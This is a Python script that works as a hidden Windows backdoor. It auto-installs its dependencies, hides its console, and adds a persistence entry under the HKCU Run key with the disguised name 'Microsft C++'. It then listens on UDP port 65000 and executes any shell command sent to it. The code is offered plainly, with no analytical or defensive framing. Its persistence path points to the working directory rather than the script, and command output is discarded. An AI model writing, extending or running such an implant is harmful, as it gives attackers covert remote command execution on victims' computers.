import os

os.system("cls")
libraries = [
    "socket",
    "subprocess",
    "shutil",
    "requests",
    "time",
    "pygetwindow",
    "ctypes",
    "pyinstaller",
]

for library in libraries:
    try:
        __import__(library)
        os.system("cls")
        print(f"{library} is installed")
        os.system("cls")
    except ImportError:
        os.system(f"pip install {library}")
        os.system("cls")
os.system("cls")
import socket
import sys
import subprocess
import requests
import time
import pygetwindow as gw
import ctypes


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))

        local_ip = s.getsockname()[0]

        return local_ip
    except socket.error as e:
        print(f"Error occurred: {e}")
    finally:
        s.close()


def hide_console():
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    user32 = ctypes.WinDLL("user32", use_last_error=True)

    SW_HIDE = 0
    hWnd = kernel32.GetConsoleWindow()

    if hWnd:
        user32.ShowWindow(hWnd, SW_HIDE)


def start_injection():
    os.system("cls")
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "Microsft C++"
    script_path = os.getcwd()
    os.system("cls")
    subprocess.run(
        [
            "reg",
            "add",
            f"HKCU\\{key_path}",
            "/v",
            key_name,
            "/t",
            "REG_SZ",
            "/d",
            f'"{sys.executable}" "{script_path}"',
            "/f",
        ],
        check=True,
    )
    os.system("cls")


def start_server():
    ip_address = get_local_ip()
    port = 65000

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((ip_address, port))

    while True:
        data, address = server_socket.recvfrom(1024)
        decoded_data = data.decode("utf-8")

        if decoded_data == "Start Injection":
            start_injection()
            print("Injected!")
            os.system("cls")

        elif decoded_data == "Open Console":
            start_injection()
            while True:
                data2, address2 = server_socket.recvfrom(1024)
                decoded_data2 = data2.decode("utf-8")

                if decoded_data2.startswith("Command: "):
                    command_ns = decoded_data2.split(": ")
                    command_s = command_ns[1]
                    output = subprocess.run(
                        command_s, shell=True, capture_output=True, text=True
                    )

        else:
            pass


hide_console()
start_server()
